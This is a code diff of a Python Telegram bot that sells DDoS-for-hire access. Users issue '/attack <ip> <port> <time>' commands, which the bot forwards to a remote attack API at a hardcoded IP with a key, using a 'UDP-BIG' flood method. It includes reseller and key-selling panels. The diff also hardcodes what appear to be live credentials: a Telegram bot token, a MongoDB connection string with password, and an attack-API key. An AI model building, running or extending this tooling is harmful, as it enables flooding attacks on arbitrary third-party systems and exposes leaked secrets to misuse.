@@ -18,10 +18,15 @@ sys.stderr.reconfigure(line_buffering=True)
 
 BOT_START_TIME = datetime.now()
 
-# ===== CONFIGURATION =====
-BOT_TOKEN = "8768507411:AAG9iaT53kcF9AR87pZOU5X8VMAQYAHESmU"
-MONGO_URL = "mongodb+srv://gb824083_db_user:chzG3YUsv2Z7ukmx@gauravxddos.ajue9og.mongodb.net/?appName=GAURAVXDDOS"
-BOT_OWNER = 8169131537
+# ===== CONFIGURATION (Railway Env Variables) =====
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8768507411:AAG9iaT53kcF9AR87pZOU5X8VMAQYAHESmU")
+MONGO_URL = os.getenv("MONGO_URL", "mongodb+srv://gb824083_db_user:chzG3YUsv2Z7ukmx@gauravxddos.ajue9og.mongodb.net/?appName=GAURAVXDDOS")
+BOT_OWNER = int(os.getenv("BOT_OWNER", "8169131537"))
+
+# ===== API CONFIG =====
+API_KEY = os.getenv("API_KEY", "qpMZA6JPG7ZDx4gC9cPoO3uO6YLlaOWq")
+API_BASE_URL = os.getenv("API_BASE_URL", "http://13.232.68.73:3938/attack")
+API_SLOTS = int(os.getenv("API_SLOTS", "10"))
 
 print("Connecting to MongoDB...", flush=True)
 try:
@@ -50,9 +55,8 @@ except Exception as e:
 bot = telebot.TeleBot(BOT_TOKEN)
 
 # ===== API LIST - 10 SLOTS (NEW API) =====
-API_KEY = "qpMZA6JPG7ZDx4gC9cPoO3uO6YLlaOWq"
-API_BASE_URL = "http://13.232.68.73:3938/attack?ip={ip}&port={port}&time={duration}&key=" + API_KEY + "&slots={slot}"
-API_LIST = [API_BASE_URL.replace("{slot}", str(i)) for i in range(1, 11)]  # 10 slots
+API_TEMPLATE = f"{API_BASE_URL}?ip={{ip}}&port={{port}}&time={{duration}}&key={API_KEY}&slots={{slot}}"
+API_LIST = [API_TEMPLATE.replace("{slot}", str(i)) for i in range(1, API_SLOTS + 1)]
 
 # ===== REQUIRED CHANNELS =====
 REQUIRED_CHANNELS = [
@@ -83,7 +87,7 @@ DEFAULT_PRIVATE_MAX_ATTACK_TIME = 300
 DEFAULT_GROUP_MAX_ATTACK_TIME = 60
 DEFAULT_PRIVATE_COOLDOWN = 30
 DEFAULT_GROUP_COOLDOWN = 120
-DEFAULT_CONCURRENT_LIMIT = 10  # Updated to match new slot count
+DEFAULT_CONCURRENT_LIMIT = API_SLOTS
 
 # ===== SETTINGS FUNCTIONS =====
 def get_setting(key, default):
@@ -244,7 +248,7 @@ def set_feedback_enabled(enabled):
 # ===== REEL FEATURE =====
 # ============================================================
 def get_reel_enabled():
-    return get_setting('reel_enabled', True)  # default ON
+    return get_setting('reel_enabled', True)
 
 def set_reel_enabled(enabled):
     set_setting('reel_enabled', enabled)
@@ -550,7 +554,7 @@ def user_has_active_attack(user_id):
         return False
 
 def get_max_concurrent():
-    return len(API_LIST)  # 10 slots
+    return len(API_LIST)
 
 def get_free_api_index():
     with _attack_lock:
@@ -662,7 +666,6 @@ def generate_global_status_ui():
         elapsed = total_dur - remaining
         percent = int((elapsed / total_dur) * 100) if total_dur > 0 else 0
 
-        # 20‑character progress bar
         filled = int(percent / 5)
         empty = 20 - filled
         bar = "█" * filled + "▒" * empty
@@ -679,21 +682,19 @@ def generate_global_status_ui():
     return header + body + footer
 
 # ============================================================
-# ===== START ATTACK FUNCTION (UPDATED) =====
+# ===== START ATTACK FUNCTION =====
 # ============================================================
 def start_attack(target, port, duration, message, attack_id, api_index, is_group=False):
     try:
         user_id = message.from_user.id
         username = message.from_user.username or message.from_user.first_name or str(user_id)
         log_attack(user_id, username, target, port, duration)
-        # Only set pending feedback if feedback is enabled
         if not is_owner(user_id) and get_feedback_enabled():
             set_pending_feedback(user_id, target, port, duration)
         cooldown_time = get_group_cooldown() if is_group else get_private_cooldown()
         method = "UDP-BIG"
         attack_start_msg = generate_attack_start_ui(target, port, duration, user_id)
 
-        # ===== SEND REEL WITH ATTACK MESSAGE =====
         try:
             if get_reel_enabled():
                 reel_id = get_random_reel()
@@ -753,7 +754,6 @@ def start_attack(target, port, duration, message, attack_id, api_index, is_group
 # ===== BOT COMMANDS =====
 # ============================================================
 
-# ===== REEL MANAGEMENT COMMANDS =====
 @bot.message_handler(commands=['reel_on'])
 def reel_on_command(message):
     if not is_owner(message.from_user.id):
@@ -874,7 +874,7 @@ def ping_command(message):
     reel_count = len(get_reel_list())
     reel_status = "✅ ON" if get_reel_enabled() else "❌ OFF"
     feedback_status = "✅ ON" if get_feedback_enabled() else "❌ OFF"
-    response = f"🏓 Pong!\n\n• Response: {response_time}ms\n• Status: 🟢 Online\n• Users: {total_users}\n• Maintenance: {maintenance_status}\n• Channel: {channel_status}\n• DDoS: {ddos_status}\n• Groups: {approved_count}\n• Uptime: {uptime_str}\n• Reels: {reel_count} ({reel_status})\n• Feedback: {feedback_status}\n• Max Slots: 10\n\n⚡ Private: Max {get_private_max_attack_time()}s | Cooldown {get_private_cooldown()}s\n⚡ Groups: Max {get_group_max_attack_time()}s | Cooldown {get_group_cooldown()}s"
+    response = f"🏓 Pong!\n\n• Response: {response_time}ms\n• Status: 🟢 Online\n• Users: {total_users}\n• Maintenance: {maintenance_status}\n• Channel: {channel_status}\n• DDoS: {ddos_status}\n• Groups: {approved_count}\n• Uptime: {uptime_str}\n• Reels: {reel_count} ({reel_status})\n• Feedback: {feedback_status}\n• Max Slots: {len(API_LIST)}\n\n⚡ Private: Max {get_private_max_attack_time()}s | Cooldown {get_private_cooldown()}s\n⚡ Groups: Max {get_group_max_attack_time()}s | Cooldown {get_group_cooldown()}s"
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=["gen"])
@@ -1302,7 +1302,7 @@ def add_group_command(message):
         bot.reply_to(message, "❌ Invalid group ID!")
         return
     if add_approved_group(group_id):
-        bot.reply_to(message, f"✅ Group Approved!\n\n📢 Group ID: `{group_id}`\n\nNow all members can attack in this group without key!\n⚡ Max Time: {get_group_max_attack_time()}s\n⏳ Cooldown: {get_group_cooldown()}s\n🛡️ DDoS: {'ON' if get_ddos_protection() else 'OFF'}\n📢 Channel: {'✅ Required' if get_channel_required() else '❌ Not Required'}\n🔢 Max Slots: 10", parse_mode="Markdown")
+        bot.reply_to(message, f"✅ Group Approved!\n\n📢 Group ID: `{group_id}`\n\nNow all members can attack in this group without key!\n⚡ Max Time: {get_group_max_attack_time()}s\n⏳ Cooldown: {get_group_cooldown()}s\n🛡️ DDoS: {'ON' if get_ddos_protection() else 'OFF'}\n📢 Channel: {'✅ Required' if get_channel_required() else '❌ Not Required'}\n🔢 Max Slots: {len(API_LIST)}", parse_mode="Markdown")
     else:
         bot.reply_to(message, f"ℹ️ Group `{group_id}` already approved!", parse_mode="Markdown")
 
@@ -1362,7 +1362,7 @@ def groups_command(message):
         return
     approved = get_approved_groups()
     response = "═══════════════════════════\n📢 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗚𝗥𝗢𝗨𝗣𝗦\n═══════════════════════════\n\n"
-    response += f"⚡ Max Time: {get_group_max_attack_time()}s\n⏳ Cooldown: {get_group_cooldown()}s\n🛡️ DDoS: {'ON' if get_ddos_protection() else 'OFF'}\n📢 Channel: {'✅ Required' if get_channel_required() else '❌ Not Required'}\n🔑 Key Required: ❌ NO\n🔢 Max Slots: 10\n\n"
+    response += f"⚡ Max Time: {get_group_max_attack_time()}s\n⏳ Cooldown: {get_group_cooldown()}s\n🛡️ DDoS: {'ON' if get_ddos_protection() else 'OFF'}\n📢 Channel: {'✅ Required' if get_channel_required() else '❌ Not Required'}\n🔑 Key Required: ❌ NO\n🔢 Max Slots: {len(API_LIST)}\n\n"
     if approved:
         response += f"📊 Total: {len(approved)}\n\n"
         for i, gid in enumerate(approved, 1):
@@ -1465,7 +1465,7 @@ def settings_command(message):
     response = "═══════════════════════════════════════\n⚙️ 𝗕𝗢𝗧 𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦\n═══════════════════════════════════════\n\n"
     response += f"📱 𝗣𝗥𝗜𝗩𝗔𝗧𝗘\n• Max Time: {get_private_max_attack_time()}s\n• Cooldown: {get_private_cooldown()}s\n• Key: ✅ YES\n• DDoS: {'✅ ON' if get_ddos_protection() else '❌ OFF'}\n• Channel: {'✅ Required' if get_channel_required() else '❌ Not Required'}\n\n"
     response += f"👥 𝗚𝗥𝗢𝗨𝗣\n• Max Time: {get_group_max_attack_time()}s\n• Cooldown: {get_group_cooldown()}s\n• Key: ❌ NO\n• DDoS: {'✅ ON' if get_ddos_protection() else '❌ OFF'}\n• Channel: {'✅ Required' if get_channel_required() else '❌ Not Required'}\n• Groups: {len(get_approved_groups())}\n\n"
-    response += f"⚡ 𝗦𝗟𝗢𝗧𝗦\n• Max Concurrent Attacks: 10\n\n"
+    response += f"⚡ 𝗦𝗟𝗢𝗧𝗦\n• Max Concurrent Attacks: {len(API_LIST)}\n\n"
     response += f"📢 𝗖𝗛𝗔𝗡𝗡𝗘𝗟\n• @DESTROYDDOSLODER\n• Status: {'REQUIRED' if get_channel_required() else 'NOT REQUIRED'}\n• Toggle: /required_on /required_off\n\n"
     response += f"🎬 𝗥𝗘𝗘𝗟 𝗙𝗘𝗔𝗧𝗨𝗥𝗘\n• Status: {'ON' if get_reel_enabled() else 'OFF'}\n• Total Reels: {len(get_reel_list())}\n• Commands: /reel_on, /reel_off, /addreel, /removereel, /listreels\n\n"
     response += f"📸 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞\n• Status: {'ON' if get_feedback_enabled() else 'OFF'}\n• Toggle: /feedback_on /feedback_off\n\n"
@@ -2201,9 +2201,6 @@ def confirm_del_exp_key_command(message):
             pass
     bot.reply_to(message, f"✅ {deleted_count} expired keys delete ho gayi!")
 
-# ============================================================
-# ===== FEEDBACK TOGGLE COMMANDS =====
-# ============================================================
 @bot.message_handler(commands=["feedback_on"])
 def feedback_on_command(message):
     if not is_owner(message.from_user.id):
@@ -2220,9 +2217,6 @@ def feedback_off_command(message):
     set_feedback_enabled(False)
     bot.reply_to(message, "✅ Feedback disabled! Users can attack without sending screenshot.")
 
-# ============================================================
-# ===== ATTACK - MAIN (UPDATED) =====
-# ============================================================
 @bot.message_handler(commands=["attack"])
 def handle_attack(message):
     if check_maintenance(message): return
@@ -2249,7 +2243,6 @@ def handle_attack(message):
     if not check_channel_join(message):
         return
 
-    # Only check pending feedback if feedback is enabled
     if get_feedback_enabled() and not is_owner(user_id):
         fb = get_pending_feedback(user_id)
         if fb:
@@ -2264,14 +2257,13 @@ def handle_attack(message):
             return
 
     active_count = get_active_attack_count()
-    max_concurrent = len(API_LIST)  # 10 slots
+    max_concurrent = len(API_LIST)
     if active_count >= max_concurrent:
         bot.reply_to(message, f"❌ Abhi chudai lgi hui hai! ({active_count}/{max_concurrent})\n\n/status se check kro")
         return
 
     command_parts = message.text.split()
     if len(command_parts) != 4:
-        # SIMPLIFIED USAGE MESSAGE
         bot.reply_to(message, "⚠️ Usage: /attack <ip> <port> <time>")
         return
 
@@ -2315,7 +2307,7 @@ def handle_attack(message):
                 'user_id': user_id,
                 'start_time': datetime.now(),
                 'end_time': datetime.now() + timedelta(seconds=duration),
-                'is_group': is_group   # <--- added for status
+                'is_group': is_group
             }
         thread = threading.Thread(target=start_attack, args=(target, port, duration, message, attack_id, api_index, is_group))
         thread.start()
@@ -2328,7 +2320,7 @@ def show_help(message):
     if check_banned(message): return
     user_id = message.from_user.id
     if is_owner(user_id):
-        help_text = '''
+        help_text = f'''
 👑 OWNER PANEL
 
 🔑 KEY MGMT: /gen, /key, /allkeys, /delkey, /delete_key, /del_exp_key, /trail, /reseller_trail, /del_trail
@@ -2343,20 +2335,19 @@ def show_help(message):
 📊 MONITOR: /live, /logs, /del_logs
 🔧 MAINTENANCE: /maintenance, /ok
 
-🔢 Max Concurrent Attacks: 10
+🔢 Max Concurrent Attacks: {len(API_LIST)}
 '''
     elif is_reseller(user_id):
-        help_text = '''
+        help_text = f'''
 💼 RESELLER PANEL
 
 🆔 ID: /id, /ping
 💰 BALANCE: /mysaldo, /prices
 🔑 KEY GEN: /gen <duration> <count>
 ⚡ ATTACK: /redeem, /attack, /status, /mykey
-🔢 Max Concurrent Attacks: 10
+🔢 Max Concurrent Attacks: {len(API_LIST)}
 '''
     else:
-        # ===== SIMPLIFIED USER HELP =====
         help_text = f'''🔐 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 𝗨𝗦𝗘𝗥
 
 • /attack <ip> <port> <time> – ⚡ Launch an attack
@@ -2782,7 +2773,7 @@ def welcome_start(message):
 🛡️ DDoS: {'ON' if get_ddos_protection() else 'OFF'}
 📢 Channel: {'✅ REQUIRED' if get_channel_required() else '❌ NOT REQUIRED'}
 📢 Groups: {len(get_approved_groups())}
-🔢 Max Slots: 10
+🔢 Max Slots: {len(API_LIST)}
 🎬 Reel Feature: {'ON' if get_reel_enabled() else 'OFF'} ({len(get_reel_list())} reels)
 📸 Feedback: {'ON' if get_feedback_enabled() else 'OFF'}
 
@@ -2797,9 +2788,8 @@ Use /settings for settings.
         response = f'''💼 Welcome Reseller, {user_name}!
 
 Use /help to see commands.
-🔢 Max Slots: 10'''
+🔢 Max Slots: {len(API_LIST)}'''
     else:
-        # ===== SIMPLIFIED USER START MESSAGE =====
         response = f'''🚀 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗕𝗼𝘁
 
 👑 𝗣𝗼𝘄𝗲𝗿𝗳𝘂𝗹 | 𝗦𝗲𝗰𝘂𝗿𝗲 | 𝗙𝗮𝘀𝘁
@@ -2819,7 +2809,6 @@ def handle_feedback_photo(message):
     user_id = message.from_user.id
     if user_id == BOT_OWNER:
         return
-    # Only process if feedback is enabled
     if not get_feedback_enabled():
         return
     fb = get_pending_feedback(user_id)
@@ -2842,7 +2831,6 @@ def handle_other_feedback(message):
     user_id = message.from_user.id
     if user_id == BOT_OWNER:
         return
-    # Only process if feedback is enabled
     if not get_feedback_enabled():
         return
     fb = get_pending_feedback(user_id)
@@ -2888,8 +2876,9 @@ load_saved_channels()
 protection.enabled = get_ddos_protection()
 
 print("🔥 BOT STARTING...")
-print(f"🌐 API: http://13.232.68.73:3938/attack")
+print(f"🌐 API: {API_BASE_URL}")
 print(f"🔑 API Key: {API_KEY}")
+print(f"🔢 API Slots: {API_SLOTS}")
 print(f"🛡️ DDoS Protection: {'ON' if get_ddos_protection() else 'OFF'}")
 print(f"📢 Channel Required: {'REQUIRED' if get_channel_required() else 'NOT REQUIRED'}")
 print(f"📢 Approved Groups: {len(get_approved_groups())}")
